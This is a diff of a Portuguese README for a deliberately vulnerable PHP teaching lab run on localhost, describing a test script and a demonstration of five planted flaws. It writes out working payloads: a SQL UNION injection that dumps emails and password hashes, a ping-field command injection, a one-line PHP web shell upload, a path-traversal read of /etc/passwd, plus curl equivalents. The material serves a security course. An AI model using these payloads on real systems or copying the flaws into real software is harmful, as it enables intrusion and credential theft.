@@ -5,11 +5,11 @@ Mural interno de avisos para o projeto de **Engenharia de Segurança**. O ambien
 **Aviso:** use apenas em máquina local (`localhost`). Não publique na internet nem trate como sistema real.
 
 
-| Item                     | Valor                                               |
-| ------------------------ | --------------------------------------------------- |
-| URL                      | `http://localhost:8080/login.php`                   |
-| Porta no host            | **8080** (MySQL **não** é exposto no host)          |
-| Relatório formal (LaTeX) | `relatorio/main.tex` → compilar para PDF            |
+| Item                     | Valor                                                                      |
+| ------------------------ | -------------------------------------------------------------------------- |
+| URL                      | `http://localhost:8080/login.php`                                          |
+| Porta no host            | **8080** (MySQL **não** é exposto no host)                                 |
+| Relatório formal (LaTeX) | `relatorio/main.tex` → compilar para PDF                                   |
 | Teste automático         | `./tests/fluxo.sh` → `[OK]`/`[ERRO]` em cada passo; saída 0 se tudo passou |
 
 
@@ -121,45 +121,70 @@ Detalhes técnicos, impacto, mitigação e referências IEEE: `relatorio/texto/c
 
 
 
-## 6. Roteiro de demonstração (banca / apresentação)
+## 6. Conferir antes da prova (`tests/fluxo.sh`)
 
-Sem limite de tempo — adapte ao que a banca pedir.
+Rode isto **depois** de `docker compose up` e **antes** de demonstrar as falhas para a banca. O script confirma que o mural responde, que o fluxo normal funciona e que as cinco vulnerabilidades ainda estão exploráveis no ambiente.
 
-### A — Mostrar o ambiente
+Cada passo imprime `[OK] descrição` ou `[ERRO] descrição`. O script **não para** no primeiro erro: executa tudo e, no final, indica se o ambiente está pronto. Código de saída **0** só se não houve nenhum `[ERRO]`.
+
+**Pré-requisito:** containers no ar e `http://localhost:8080` acessível na máquina onde você roda o comando.
 
 ```bash
-docker compose ps
-docker compose exec web php -v
+chmod +x tests/fluxo.sh
+./tests/fluxo.sh
 ```
 
-Opcional: mostrar `apache/000-default.conf` e `mysql/my.cnf`.
+**O que ele verifica (resumo):** container `web` e PHP 5.6.40 (se `docker` estiver no PATH); login Ivan; publicar e listar aviso; páginas do menu autenticado; SQL `UNION` na busca; login fraco (Daniel com senha errada); comando na Impressora; upload de `.php` em anexos; LFI de `/etc/passwd`. O teste de upload deixa `site/anexos/fluxo-probe-<timestamp>.php` — pode apagar depois.
 
-*Frase:* “Mural em Docker, PHP 5.6 e MySQL 5.7, só a porta 8080 no host.”
+Se algo falhar, use a seção **8. Problemas comuns** antes de seguir para a demonstração manual abaixo.
 
-### B — Tour normal
+---
 
-1. Login: `ivan@avisos.br` / `aviso123`
-2. Publicar um aviso e ver **Ivan** na lista
-3. Mostrar Impressora, Modelos, Anexos no menu
-4. Meu usuário → Sair
 
-*Frase:* “O mural funciona; as falhas são defeitos em cima disso.”
 
-### C — Ataque principal (SQL na busca)
+## 7. Demonstração das vulnerabilidades
 
-1. Login como Ivan → **Avisos**
-2. Colar na busca:
+Use a conta **Ivan** (`ivan@avisos.br` / `aviso123`) salvo onde indicado outro usuário. Mostre primeiro o fluxo normal (seção 3), depois cada falha. O relatório técnico está em `relatorio/texto/conteudo.tex`.
+
+### 7.1 Autenticação fraca
+
+**O que é:** depois de tentar o login “correto”, o site ainda aceita entrar só com e-mail válido e **qualquer senha não vazia**, sem verificar o hash.
+
+**Onde está:** `site/login.php` (condição com `definir_sessao_por_email()`) e `site/includes/auth.php`.
+
+**Como demonstrar:**
+
+1. Abra `http://localhost:8080/login.php` (ou **Sair** se já estiver logado).
+2. E-mail: `daniel@avisos.br`. Senha: qualquer texto, por exemplo `123` (não use `aviso123`).
+3. Clique **Entrar** — deve ir para **Avisos** sem mensagem de erro.
+4. Abra **Meu usuário** e mostre o nome **Daniel** e o e-mail `daniel@avisos.br`.
+5. (Opcional) Abra `login.php` e `auth.php` e aponte a segunda condição do `if` no POST do login.
+
+**O que a banca deve ver:** personificação de outro usuário do mural sem saber a senha real.
+
+### 7.2 Injeção SQL na busca (demonstração principal)
+
+**O que é:** com busca preenchida, a listagem usa SQL montado por concatenação em `buscar_titulo_montado()`; um atacante pode injetar um `UNION` e exibir colunas de outras tabelas (por exemplo `usuarios`).
+
+**Onde está:** `site/avisos.php` — compare com `listar_avisos()` em `site/includes/avisos.php` (consulta preparada), usada quando a busca está vazia.
+
+**Como demonstrar:**
+
+1. Login como **Ivan**.
+2. Menu **Avisos**.
+3. No campo **Buscar no título**, cole exatamente (incluindo aspas e `#` no final):
 
 ```text
 x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#
 ```
 
-1. Mostrar e-mails e hashes na tela (a lista normal não mostra isso).
-2. Mostrar `buscar_titulo_montado()` em `site/avisos.php` vs consulta preparada em `listar_avisos()`.
+4. Clique **Buscar**.
+5. Mostre na página e-mails (`@avisos.br`) e hashes (`$2y$...`) que **não** aparecem na listagem normal sem busca.
+6. (Opcional) Mostre no código a linha do `LIKE '%" . $busca . "%'` em `buscar_titulo_montado()`.
 
-*Frase:* “A busca monta o SQL com o que digito; o UNION puxa dados de `usuarios`.”
+**O que a banca deve ver:** vazamento de dados do banco pela interface web.
 
-**Terminal (opcional):**
+**Terminal (opcional, mesmo payload):**
 
 ```bash
 jar=$(mktemp)
@@ -172,19 +197,21 @@ curl -s -c "$jar" -b "$jar" -G --data-urlencode \
 rm -f "$jar"
 ```
 
+### 7.3 Injeção de comando (Impressora)
 
+**O que é:** o campo “servidor” é concatenado em `shell_exec('ping -c 2 ' . $host)`, permitindo encadear comandos com `;`.
 
-### D — Login fraco
+**Onde está:** `site/impressora.php`.
 
-- E-mail: `daniel@avisos.br`, senha qualquer não vazia (ex.: `123`)  
-- **Meu usuário** mostra **Daniel**  
-- Código: `login.php` e `definir_sessao_por_email()` em `site/includes/auth.php`
+**Como demonstrar:**
 
+1. Login como **Ivan**.
+2. Menu **Impressora**.
+3. No campo **Servidor**, digite: `127.0.0.1; whoami` (ou `127.0.0.1; id`).
+4. Clique **Testar**.
+5. Na caixa de saída (`<pre>`), mostre a linha com `www-data` (ou a saída de `id`).
 
-
-### E — Intrusão pelo PHP (servidor)
-
-**E.1 Impressora** — campo Servidor: `127.0.0.1; id` → saída com `www-data`
+**Terminal (equivalente):**
 
 ```bash
 jar=$(mktemp)
@@ -195,56 +222,53 @@ curl -s -c "$jar" -b "$jar" -d 'host=127.0.0.1;+whoami' \
 rm -f "$jar"
 ```
 
-**E.2 Anexos** — criar `cmd.php`:
+**O que a banca deve ver:** execução de comando no servidor web (intrusão pelo PHP), usuário do processo Apache.
+
+### 7.4 Upload de arquivo executável (web shell)
+
+**O que é:** anexos são gravados em `site/anexos/` com o nome original, sem bloquear `.php`; o Apache pode executar o arquivo pela URL pública.
+
+**Onde está:** `site/anexo.php` e diretório `site/anexos/`.
+
+**Como demonstrar:**
+
+1. Login como **Ivan**.
+2. Crie no seu computador um arquivo `cmd.php` com:
 
 ```php
 <?php echo shell_exec($_GET["c"]); ?>
 ```
 
-Enviar em **Anexos**, abrir `http://localhost:8080/anexos/cmd.php?c=id`. Apague o arquivo depois se não quiser deixá-lo no projeto.
+3. Menu **Anexos** → escolha `cmd.php` → **Enviar** (mensagem de sucesso com `anexos/cmd.php`).
+4. No navegador abra: `http://localhost:8080/anexos/cmd.php?c=id`
+5. Mostre a saída com `uid=` / `www-data`.
+6. Após a demo, apague `site/anexos/cmd.php` no projeto se não quiser deixar a shell no disco.
 
-**E.3 Modelos (LFI)** — URL:
+**O que a banca deve ver:** persistência — ponto de execução remota reutilizável no servidor.
+
+### 7.5 Inclusão de arquivo local (LFI)
+
+**O que é:** `modelo.php` inclui o parâmetro `modelo` a partir de `site/modelos/` sem impedir `..`; é possível ler arquivos fora da pasta (por exemplo `/etc/passwd`).
+
+**Onde está:** `site/modelo.php`.
+
+**Como demonstrar:**
+
+1. Login como **Ivan** (necessário para a página).
+2. No navegador, abra:
 
 ```text
 http://localhost:8080/modelo.php?modelo=../../../../etc/passwd
 ```
 
+3. Mostre linhas como `root:` no corpo da página.
+4. (Opcional) Compare com os links legítimos `modelo=padrao.php` e `modelo=urgente.php` na mesma tela.
 
+**O que a banca deve ver:** leitura de arquivo do sistema de arquivos do container via parâmetro GET.
 
-### F — Encerramento
+### 7.6 Encerramento sugerido
 
-Resumir: login fraco, SQL, comando/upload no servidor, leitura de arquivo. Ambiente só para aula. **Parte 2** (fora deste pacote): alavancagem com outra máquina (rsync/crontab, conforme enunciado).
-
-```bash
-docker compose down
-```
-
----
-
-
-
-## 7. Testes
-
-
-
-### O que faz `tests/fluxo.sh`
-
-É um **ensaio automático antes da banca**: percorre o **fluxo normal** do mural e faz *smoke tests* das **cinco falhas intencionais** do roteiro (SQL na busca, login fraco, Impressora, upload, LFI). Cada verificação imprime **`[OK] descrição`** ou **`[ERRO] descrição`**; no final, resume se o ambiente está pronto.
-
-**Ambiente (se `docker` estiver no PATH):** container `web` rodando e PHP **5.6.40**.
-
-**Fluxo normal:** login HTTP 200; login Ivan; publicar e listar aviso; páginas Impressora, Modelos, Anexos e Meu usuário; e-mail de Ivan no perfil.
-
-**Falhas (demonstração):** `UNION` na busca; Daniel com senha errada; `whoami` na Impressora; upload de `.php` em anexos; LFI de `/etc/passwd`.
-
-O script **não para no primeiro erro**: executa todos os passos e termina com código **0** só se nenhum `[ERRO]` apareceu. Cria um arquivo `anexos/fluxo-probe-<timestamp>.php` no container (web shell de teste); pode apagar depois manualmente.
-
-**Pré-requisito:** containers no ar (`docker compose up -d`) e porta **8080** acessível na máquina onde você roda o script.
-
-```bash
-chmod +x tests/fluxo.sh
-./tests/fluxo.sh
-```
+Reforce: ambiente só local; falhas intencionais para a disciplina; mitigações no relatório (`relatorio/main.tex`). Se a banca pedir, rode de novo `./tests/fluxo.sh` para mostrar que tudo ainda responde.
 
 ---
 
